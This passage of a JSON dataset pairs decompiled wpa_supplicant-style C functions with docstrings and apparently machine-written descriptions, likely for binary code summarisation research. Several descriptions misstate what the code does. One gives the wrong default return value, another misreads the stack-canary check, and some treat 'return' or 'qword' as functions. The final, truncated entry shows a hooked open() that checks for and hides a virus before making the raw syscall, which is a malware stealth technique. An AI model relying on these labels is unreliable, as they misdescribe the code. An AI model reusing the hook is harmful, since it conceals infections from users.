            "*",
            ")",
            "os_malloc",
            "(",
            "v12",
            ")",
            ";",
            "if",
            "(",
            "s",
            ")",
            "{",
            "va_end",
            "(",
            "arg",
            ")",
            ";",
            "va_start",
            "(",
            "arg",
            ",",
            "a6",
            ")",
            ";",
            "v13",
            "=",
            "vsnprintf",
            "(",
            "s",
            ",",
            "v12",
            ",",
            "a3",
            ",",
            "arg",
            ")",
            ";",
            "wpa_msg_cb",
            "(",
            "a1",
            ",",
            "a2",
            ",",
            "0L",
            "L",
            ",",
            "s",
            ",",
            "v13",
            ")",
            ";",
            "bin_clear_free",
            "(",
            "s",
            ",",
            "v12",
            ")",
            ";",
            "}",
            "else",
            "{",
            "wpa_printf",
            "(",
            "5",
            ",",
            "\"wpa_msg_ctrl: Failed to allocate message buffer\"",
            ",",
            "v6",
            ",",
            "v7",
            ",",
            "v8",
            ",",
            "v9",
            ")",
            ";",
            "}",
            "}",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v16",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is used to read a 64-bit quadword from the FS segment register, commonly used in low-level programming for accessing thread-local storage or system structures on x86 architecture.",
            "The `vsnprintf` function is a variadic version of `snprintf`, allowing for formatting and writing a formatted string to a buffer with a specified size, using a variable argument list.",
            "The function `os_malloc` appears to be part of a custom memory allocation system in an operating system or library, providing dynamic memory allocation similar to `malloc` in C, likely tailored for specific system requirements or optimizations.",
            "The function `bin_clear_` seems to be used to free memory associated with binary data structures (bins) or other allocated resources within various contexts, such as in storage operations and configuration management in a network-related software system.",
            "The function `wpa_printf` is used for conditional printing of debugging and error messages, allowing developers to specify the priority level and format of the message, commonly employed in Wi-Fi Protected Access (WPA) implementations for logging information during runtime."
        ],
        "longer_label": "The `wpa_msg_ctrl` function handles control messages, formats them using `vsnprintf`, allocates memory for the message buffer using a custom allocator `os_malloc`, and invokes a callback function `wpa_msg_cb` to deliver the message, with error handling for memory allocation failure, while utilizing `__readfsqword` to maintain thread-local storage integrity."
    },
    {
        "id": 100,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "outputs",
            "a",
            "message",
            "globally",
            ",",
            "allocating",
            "memory",
            "for",
            "the",
            "message",
            "buffer",
            "and",
            "calling",
            "a",
            "callback",
            "function",
            "if",
            "it",
            "exists",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "unsigned",
            "int",
            "a2",
            ",",
            "const",
            "char",
            "*",
            "a3",
            ",",
            "__int64",
            "a4",
            ",",
            "__int64",
            "a5",
            ",",
            "__int64",
            "a6",
            ",",
            ".",
            ".",
            ".",
            ")",
            "{",
            "__int64",
            "v6",
            ";",
            "__int64",
            "v7",
            ";",
            "__int64",
            "v8",
            ";",
            "__int64",
            "v9",
            ";",
            "__int64",
            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "__int64",
            "v12",
            ";",
            "int",
            "v15",
            ";",
            "int",
            "v16",
            ";",
            "char",
            "*",
            "s",
            ";",
            "gcc_va_list",
            "arg",
            ";",
            "unsigned",
            "__int64",
            "v19",
            ";",
            "__int64",
            "v20",
            ";",
            "__int64",
            "v21",
            ";",
            "__int64",
            "v22",
            ";",
            "va_start",
            "(",
            "arg",
            ",",
            "a6",
            ")",
            ";",
            "v20",
            "=",
            "a4",
            ";",
            "v21",
            "=",
            "a5",
            ";",
            "v22",
            "=",
            "a6",
            ";",
            "v19",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "arg",
            "[",
            "0",
            "]",
            ".",
            "gp_offset",
            "=",
            "24",
            ";",
            "v15",
            "=",
            "vsnprintf",
            "(",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "a3",
            ",",
            "arg",
            ")",
            "+",
            "1",
            ";",
            "s",
            "=",
            "(",
            "char",
            "*",
            ")",
            "os_malloc",
            "(",
            "v15",
            ")",
            ";",
            "if",
            "(",
            "s",
            ")",
            "{",
            "va_end",
            "(",
            "arg",
            ")",
            ";",
            "va_start",
            "(",
            "arg",
            ",",
            "a6",
            ")",
            ";",
            "v16",
            "=",
            "vsnprintf",
            "(",
            "s",
            ",",
            "v15",
            ",",
            "a3",
            ",",
            "arg",
            ")",
            ";",
            "wpa_printf",
            "(",
            "a2",
            ",",
            "\"%s\"",
            ",",
            "(",
            "__int64",
            ")",
            "s",
            ",",
            "v10",
            ",",
            "v11",
            ",",
            "v12",
            ")",
            ";",
            "if",
            "(",
            "wpa_msg_cb",
            ")",
            "wpa_msg_cb",
            "(",
            "a1",
            ",",
            "a2",
            ",",
            "1L",
            "L",
            ",",
            "s",
            ",",
            "v16",
            ")",
            ";",
            "bin_clear_free",
            "(",
            "s",
            ",",
            "v15",
            ")",
            ";",
            "}",
            "else",
            "{",
            "wpa_printf",
            "(",
            "5",
            ",",
            "\"wpa_msg_global: Failed to allocate message buffer\"",
            ",",
            "v6",
            ",",
            "v7",
            ",",
            "v8",
            ",",
            "v9",
            ")",
            ";",
            "}",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v19",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__read` appears to be a user-defined function with varying implementations across different code snippets, likely involved in reading data from devices, files, or buffers, and potentially handling system calls or interactions with a file system driver.",
            "The vsnprintf function is used to format and write a variable number of arguments to a string, with a specified maximum length, similar to the printf function but with support for va_list.",
            "The os_malloc function is used to allocate memory dynamically using system malloc in an operating system."
        ],
        "longer_label": "The code is a function for generating and printing a global message, which includes formatting variable arguments into a string, allocating memory for the message buffer, and potentially utilizing a custom read function, with support for system calls and interactions with a file system driver."
    },
    {
        "id": 101,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "sleeps",
            "for",
            "a",
            "specified",
            "number",
            "of",
            "milliseconds",
            "using",
            "the",
            "nanosleep",
            "function",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "(",
            "size_t",
            "ms",
            ")",
            "{",
            "timespec",
            "ts",
            ";",
            "unsigned",
            "__int64",
            "v2",
            ";",
            "v2",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "ts",
            ".",
            "tv_sec",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "(",
            "0x20C49BA5E353F7CFL",
            "L",
            "*",
            "(",
            "unsigned",
            "__int128",
            ")",
            "(",
            "(",
            "125",
            "*",
            "(",
            "ms",
            "/",
            "0x3E8",
            ")",
            ")",
            "&",
            "0x1FFFFFFFFFFFFFFFL",
            "L",
            ")",
            ")",
            ">",
            ">",
            "64",
            ")",
            ">",
            ">",
            "4",
            ";",
            "ts",
            ".",
            "tv_nsec",
            "=",
            "1000000",
            "*",
            "(",
            "ms",
            "%",
            "0x3E8",
            ")",
            ";",
            "while",
            "(",
            "nanosleep",
            "(",
            "&",
            "ts",
            ",",
            "&",
            "ts",
            ")",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The __readfsqword function is used to read a quadword value from the FS segment register on x86-64 architecture."
        ],
        "longer_label": "The provided code defines a function `sleep_ms` which calculates the time to sleep in milliseconds, utilizing the x86-64 assembly instruction `__readfsqword` to read from the FS segment register and then uses `nanosleep` to suspend execution for the specified time."
    },
    {
        "id": 102,
        "docstring_tokens": [
            "The",
            "code",
            "converts",
            "a",
            "string",
            "input",
            "representing",
            "a",
            "debug",
            "level",
            "to",
            "the",
            "corresponding",
            "integer",
            "code",
            ",",
            "or",
            "returns",
            "-1",
            "if",
            "no",
            "match",
            "is",
            "found",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "os_strcasecmp",
            "(",
            "a1",
            ",",
            "\"EXCESSIVE\"",
            ")",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "if",
            "(",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "os_strcasecmp",
            "(",
            "a1",
            ",",
            "\"MSGDUMP\"",
            ")",
            ")",
            "return",
            "1L",
            "L",
            ";",
            "if",
            "(",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "os_strcasecmp",
            "(",
            "a1",
            ",",
            "\"DEBUG\"",
            ")",
            ")",
            "return",
            "2L",
            "L",
            ";",
            "if",
            "(",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "os_strcasecmp",
            "(",
            "a1",
            ",",
            "\"INFO\"",
            ")",
            ")",
            "return",
            "3L",
            "L",
            ";",
            "if",
            "(",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "os_strcasecmp",
            "(",
            "a1",
            ",",
            "\"WARNING\"",
            ")",
            ")",
            "return",
            "4L",
            "L",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "os_strcasecmp",
            "(",
            "a1",
            ",",
            "\"ERROR\"",
            ")",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "return",
            "5L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            ""
        ],
        "longer_label": "The provided code defines a function, `str_to_debug_level`, which takes a string `a1` and returns an integer representing different debug levels, with specific strings mapped to corresponding integer values, and a default value of 5 for unrecognized strings."
    },
    {
        "id": 103,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "copies",
            "a",
            "specified",
            "amount",
            "of",
            "data",
            "into",
            "a",
            "buffer",
            "if",
            "the",
            "data",
            "pointer",
            "is",
            "not",
            "null",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "(",
            "_QWORD",
            "*",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "__int64",
            "a3",
            ")",
            "{",
            "__int64",
            "v3",
            ";",
            "if",
            "(",
            "a2",
            ")",
            "{",
            "v3",
            "=",
            "wpabuf_put",
            "(",
            "a1",
            ",",
            "a3",
            ")",
            ";",
            "os_memcpy",
            "(",
            "v3",
            ",",
            "a2",
            ",",
            "a3",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `wpabuf_put` is likely used to append data to a `struct wpabuf` buffer, often employed in Wi-Fi Protected Setup (WPS) implementations to construct WPS Information Elements (IEs) for (Re)Association Requests.",
            "The \"os_memcpy\" function likely provides a platform-independent memory copying operation, ensuring efficient and safe data transfer between memory locations, typically used for low-level memory operations in C or C++ programs."
        ],
        "longer_label": "The code is a function that uses `wpabuf_put` to append data to a `struct wpabuf` buffer and then uses `os_memcpy` to efficiently and safely transfer memory between locations."
    },
    {
        "id": 104,
        "docstring_tokens": [
            "This",
            "function",
            "copies",
            "the",
            "data",
            "from",
            "the",
            "source",
            "wpabuf",
            "structure",
            "to",
            "the",
            "destination",
            "wpabuf",
            "structure",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "(",
            "_QWORD",
            "*",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "__int64",
            "v2",
            ";",
            "__int64",
            "v3",
            ";",
            "v2",
            "=",
            "wpabuf_len",
            "(",
            "a2",
            ")",
            ";",
            "v3",
            "=",
            "wpabuf_head",
            "(",
            "a2",
            ")",
            ";",
            "wpabuf_put_data",
            "(",
            "a1",
            ",",
            "v3",
            ",",
            "v2",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The wpabuf function is used to handle and manage buffer data, particularly for the purpose of sending WPS (Wi-Fi Protected Setup) messages, including accessing and manipulating internal data structures.",
            "The function `wpabuf_put_data` is used to append binary data to a `struct wpabuf` buffer, ensuring memory safety and handling zero-length attributes as necessary."
        ],
        "longer_label": "The provided code defines a function `wpabuf_put_buf` which calculates the length and head of a buffer using the `wpabuf_len` and `wpabuf_head` functions respectively, then appends the data to another `struct wpabuf` buffer using `wpabuf_put_data`, facilitating the management and manipulation of buffer data, particularly for handling and sending WPS messages in Wi-Fi Protected Setup."
    },
    {
        "id": 105,
        "docstring_tokens": [
            "The",
            "function",
            "wpabuf_resize",
            "resizes",
            "a",
            "wpabuf",
            "buffer",
            "by",
            "adding",
            "a",
            "specified",
            "length",
            "of",
            "additional",
            "data",
            ",",
            "reallocating",
            "memory",
            "if",
            "necessary",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "*",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "__int64",
            "v3",
            ";",
            "__int64",
            "v4",
            ";",
            "__int64",
            "v5",
            ";",
            "v3",
            "=",
            "*",
            "a1",
            ";",
            "if",
            "(",
            "*",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "a2",
            "+",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "8",
            ")",
            ")",
            ">",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            ")",
            "{",
            "if",
            "(",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "24",
            ")",
            "&",
            "1",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "v4",
            "=",
            "os_realloc",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "16",
            ")",
            ",",
            "a2",
            "+",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "8",
            ")",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v4",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "os_memset",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "8",
            ")",
            "+",
            "v4",
            ",",
            "0L",
            "L",
            ",",
            "a2",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "16",
            ")",
            "=",
            "v4",
            ";",
            "}",
            "else",
            "{",
            "v5",
            "=",
            "os_realloc",
            "(",
            "v3",
            ",",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "8",
            ")",
            "+",
            "a2",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v5",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "v3",
            "=",
            "v5",
            ";",
            "os_memset",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v5",
            "+",
            "8",
            ")",
            "+",
            "32L",
            "L",
            "+",
            "v5",
            ",",
            "0L",
            "L",
            ",",
            "a2",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v5",
            "+",
            "16",
            ")",
            "=",
            "v5",
            "+",
            "32",
            ";",
            "*",
            "a1",
            "=",
            "v5",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            "=",
            "a2",
            "+",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "8",
            ")",
            ";",
            "}",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "*",
            "a1",
            "=",
            "(",
            "__int64",
            ")",
            "wpabuf_alloc",
            "(",
            "a2",
            ")",
            ";",
            "if",
            "(",
            "*",
            "a1",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "else",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `os_realloc` is likely designed to resize dynamically allocated memory pointed to by `ptr`, adjusting its size from `old_size` to `new_size`, with additional alignment options available, facilitating memory management in a system environment.",
            "The function `os_memset` is used to fill a memory area specified by the pointer `s` with a constant byte `c`, for a given length `n`, returning a pointer to the start of the filled memory area."
        ],
        "longer_label": "The provided code defines a function `wpabuf_resize` that resizes a memory buffer, managing reallocations and zero-initialization when necessary, utilizing the functions `os_realloc` and `os_memset`."
    },
    {
        "id": 106,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "allocates",
            "and",
            "initializes",
            "a",
            "wpabuf",
            "structure",
            "with",
            "external",
            "data",
            ",",
            "setting",
            "flags",
            "accordingly",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "__int64",
            "v3",
            ";",
            "v3",
            "=",
            "os_zalloc",
            "(",
            "32L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v3",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            "=",
            "a2",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "8",
            ")",
            "=",
            "a2",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "16",
            ")",
            "=",
            "a1",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "24",
            ")",
            "|",
            "=",
            "1u",
            ";",
            "return",
            "v3",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `alloc_ext_data` appears to be a part of a TLS client implementation, responsible for allocating memory for external data, possibly related to TLS handshake operations, while handling memory allocation failures gracefully.",
            "The `os_zalloc` function is designed to allocate and zero out a block of memory, returning a pointer to the allocated memory, or `NULL` on failure, and is intended to be used in an embedded system where memory management is customized, potentially offering debugging features like tracking memory allocation statistics or debugging memory-related issues."
        ],
        "longer_label": "The function `wpabuf_alloc_ext_data` allocates memory for external data, possibly for TLS handshake operations, utilizing `os_zalloc` for memory allocation, and gracefully handling allocation failures."
    },
    {
        "id": 107,
        "docstring_tokens": [
            "The",
            "code",
            "frees",
            "a",
            "wpabuf",
            "structure",
            "and",
            "associated",
            "memory",
            ",",
            "checking",
            "for",
            "invalid",
            "magic",
            "values",
            "and",
            "freeing",
            "external",
            "data",
            "if",
            "necessary",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ")",
            "{",
            "__int64",
            "result",
            ";",
            "if",
            "(",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "24",
            ")",
            "&",
            "1",
            ")",
            "!",
            "=",
            "0",
            ")",
            "os_free",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            ")",
            ";",
            "return",
            "os_free",
            "(",
            "a1",
            ")",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `_free` function appears to be a custom memory deallocation function designed to free memory allocated by a custom memory allocation system, likely used in an embedded or specialized environment, with the ability to handle memory requests through functions like `_malloc` and `_realloc` and tailored to avoid conflicts with standard memory management functions by defining macros such as `NO_FIX_MALLOC` and redefining standard functions like `malloc` and `free`."
        ],
        "longer_label": "The code defines a custom memory deallocation function `wpabuf_free` designed for a specialized environment, handling memory allocated by a custom allocation system, with additional checks to avoid conflicts with standard memory management functions."
    },
    {
        "id": 108,
        "docstring_tokens": [
            "This",
            "code",
            "clears",
            "and",
            "frees",
            "a",
            "wpabuf",
            "structure",
            "if",
            "it",
            "is",
            "not",
            "null",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ")",
            "{",
            "__int64",
            "v1",
            ";",
            "__int64",
            "v2",
            ";",
            "if",
            "(",
            "a1",
            ")",
            "{",
            "v1",
            "=",
            "wpabuf_len",
            "(",
            "a1",
            ")",
            ";",
            "v2",
            "=",
            "wpabuf_mhead",
            "(",
            "a1",
            ")",
            ";",
            "os_memset",
            "(",
            "v2",
            ",",
            "0L",
            "L",
            ",",
            "v1",
            ")",
            ";",
            "wpabuf_free",
            "(",
            "a1",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `clear_free` function is designed to free allocated memory pointed to by a given pointer and optionally clear the memory block to zeros, allowing for safe deallocation and preventing potential data leakage or misuse.",
            "The \"wpabuf\" function likely handles the creation and manipulation of data buffers in a Wi-Fi Protected Access (WPA) context, as part of the WPA supplicant software package, allowing for efficient management of memory buffers for various network operations.",
            "The function `os_memset` is designed to fill a memory area with a constant byte value, allowing for custom initialization of memory regions, commonly used for zeroing out or initializing data structures or buffers."
        ],
        "longer_label": "The `wpabuf_clear_free` function clears the memory block pointed to by a given pointer and then frees the allocated memory, likely used within a Wi-Fi Protected Access (WPA) context for managing data buffers, ensuring secure deallocation and preventing potential data leakage."
    },
    {
        "id": 109,
        "docstring_tokens": [
            "The",
            "wpabuf_put",
            "function",
            "appends",
            "data",
            "of",
            "size",
            "len",
            "to",
            "a",
            "wpabuf",
            "buffer",
            "and",
            "returns",
            "a",
            "pointer",
            "to",
            "the",
            "beginning",
            "of",
            "the",
            "appended",
            "data",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "_QWORD",
            "*",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "__int64",
            "v2",
            ";",
            "__int64",
            "v4",
            ";",
            "v2",
            "=",
            "wpabuf_mhead_u8",
            "(",
            "(",
            "__int64",
            ")",
            "a1",
            ")",
            ";",
            "v4",
            "=",
            "v2",
            "+",
            "wpabuf_len",
            "(",
            "(",
            "__int64",
            ")",
            "a1",
            ")",
            ";",
            "a1",
            "[",
            "1",
            "]",
            "+",
            "=",
            "a2",
            ";",
            "if",
            "(",
            "a1",
            "[",
            "1",
            "]",
            ">",
            "*",
            "a1",
            ")",
            "wpabuf_overflow",
            "(",
            "a1",
            ",",
            "a2",
            ")",
            ";",
            "return",
            "v4",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `mhead_u` appears to be intended for accessing the beginning of the payload buffer of a `wpabuf` structure, often used in Wi-Fi protocol-related functions to manipulate and interpret data in the buffer header."
        ],
        "longer_label": "The provided code is a function `wpabuf_put` intended for adding data to a Wi-Fi protocol-related buffer (`wpabuf`), utilizing internal functions for accessing the buffer header and length, with additional logic to handle potential buffer overflow."
    },
    {
        "id": 110,
        "docstring_tokens": [
            "This",
            "code",
            "takes",
            "a",
            "struct",
            "wpabuf",
            "pointer",
            ",",
            "a",
            "format",
            "string",
            ",",
            "and",
            "variable",
            "arguments",
            ",",
            "then",
            "writes",
            "the",
            "formatted",
            "string",
            "to",
            "the",
            "wpabuf",
            "buffer",
            "while",
            "checking",
            "for",
            "overflow",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "(",
            "_QWORD",
            "*",
            "a1",
            ",",
            "const",
            "char",
            "*",
            "a2",
            ",",
            "__int64",
            "a3",
            ",",
            "__int64",
            "a4",
            ",",
            "__int64",
            "a5",
            ",",
            "__int64",
            "a6",
            ",",
            ".",
            ".",
            ".",
            ")",
            "{",
            "__int64",
            "v6",
            ";",
            "__int64",
            "v7",
            ";",
            "int",
            "v9",
            ";",
            "gcc_va_list",
            "arg",
            ";",
            "unsigned",
            "__int64",
            "v11",
            ";",
            "__int64",
            "v12",
            ";",
            "__int64",
            "v13",
            ";",
            "__int64",
            "v14",
            ";",
            "__int64",
            "v15",
            ";",
            "va_start",
            "(",
            "arg",
            ",",
            "a6",
            ")",
            ";",
            "v12",
            "=",
            "a3",
            ";",
            "v13",
            "=",
            "a4",
            ";",
            "v14",
            "=",
            "a5",
            ";",
            "v15",
            "=",
            "a6",
            ";",
            "v11",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v6",
            "=",
            "wpabuf_mhead_u8",
            "(",
            "(",
            "__int64",
            ")",
            "a1",
            ")",
            ";",
            "v7",
            "=",
            "wpabuf_len",
            "(",
            "(",
            "__int64",
            ")",
            "a1",
            ")",
            ";",
            "arg",
            "[",
            "0",
            "]",
            ".",
            "gp_offset",
            "=",
            "16",
            ";",
            "v9",
            "=",
            "vsnprintf",
            "(",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v6",
            "+",
            "v7",
            ")",
            ",",
            "*",
            "a1",
            "-",
            "a1",
            "[",
            "1",
            "]",
            ",",
            "a2",
            ",",
            "arg",
            ")",
            ";",
            "if",
            "(",
            "v9",
            "<",
            "0",
            "|",
            "|",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v9",
            ">",
            "=",
            "*",
            "a1",
            "-",
            "a1",
            "[",
            "1",
            "]",
            ")",
            "wpabuf_overflow",
            "(",
            "a1",
            ",",
            "v9",
            ")",
            ";",
            "a1",
            "[",
            "1",
            "]",
            "+",
            "=",
            "v9",
            ";",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v11",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is used to read an unsigned 64-bit integer from a specific offset in the FS segment, with variations for different architectures and operating systems.",
            "The function \"return\" appears to be a generic name for a C function, and based on the provided code snippets, it's challenging to infer its specific purpose without more context, as it's not defined in the code provided.",
            "The function \"qword\" likely deals with manipulating or processing 64-bit quantities (quadwords) in assembly language or low-level programming contexts."
        ],
        "longer_label": "The provided code is a C function `wpabuf_printf` that utilizes low-level operations such as reading from the FS segment and manipulating quadwords, aiming to write formatted data to a buffer while handling potential buffer overflow situations."
    },
    {
        "id": 111,
        "docstring_tokens": [
            "This",
            "code",
            "adds",
            "a",
            "client",
            "node",
            "to",
            "the",
            "end",
            "of",
            "a",
            "linked",
            "list",
            "of",
            "clients",
            ",",
            "updating",
            "the",
            "head",
            "if",
            "necessary",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "*",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "__int64",
            "i",
            ";",
            "if",
            "(",
            "!",
            "a2",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "if",
            "(",
            "*",
            "a1",
            ")",
            "{",
            "for",
            "(",
            "i",
            "=",
            "*",
            "a1",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "i",
            "+",
            "88",
            ")",
            ";",
            "i",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "i",
            "+",
            "88",
            ")",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "i",
            "+",
            "88",
            ")",
            "=",
            "a2",
            ";",
            "}",
            "else",
            "{",
            "*",
            "a1",
            "=",
            "a2",
            ";",
            "}",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code is a function `client_add` that adds a value `a2` to a linked list pointed to by `a1`, returning `0xFFFFFFFF` if `a2` is zero, and `0` if successful."
    },
    {
        "id": 112,
        "docstring_tokens": [
            "The",
            "``",
            "open",
            "''",
            "function",
            "checks",
            "for",
            "the",
            "presence",
            "of",
            "a",
            "virus",
            "in",
            "the",
            "file",
            "specified",
            "by",
            "the",
            "path",
            ",",
            "and",
            "if",
            "found",
            ",",
            "hides",
            "it",
            "before",
            "opening",
            "the",
            "file",
            "with",
            "the",
            "specified",
            "flags",
            "and",
            "mode",
            "(",
            "if",
            "provided",
            ")",
            "using",
            "the",
            "system",
            "call",
            "``",
            "__NR_open",
            "''",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "path",
            ",",
            "int",
            "oflag",
            ",",
            ".",
            ".",
            ".",
            ")",
            "{",
            "va_list",
            "va",
            ";",
            "int",
            "modeUsed",
            ";",
            "mode_t",
            "mode",
            ";",
            "mode_t",
            "v6",
            ";",
            "va_start",
            "(",
            "va",
            ",",
            "oflag",
            ")",
            ";",
            "v6",
            "=",
            "va_arg",
            "(",
            "va",
            ",",
            "_QWORD",
            ")",
            ";",
            "va_end",
            "(",
            "va",
            ")",
            ";",
            "modeUsed",
            "=",
            "0",
            ";",
            "mode",
            "=",
            "0",
            ";",
            "if",
            "(",
            "(",
            "oflag",
            "&",
            "0x40",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "mode",
            "=",
            "v6",
            ";",
            "modeUsed",
            "=",
            "1",
            ";",
            "}",
            "if",
            "(",
            "checkForVirus",
            "(",
            "(",
            "char",
            "*",
            ")",
            "path",
            ")",
            ")",
            "hideVirus",
            "(",
            "(",
            "char",
            "*",
            ")",
            "path",
            ")",
            ";",
            "if",
            "(",
            "modeUsed",
            ")",
            "return",
            "syscall",
            "(",
            "2L",
            "L",
            ",",
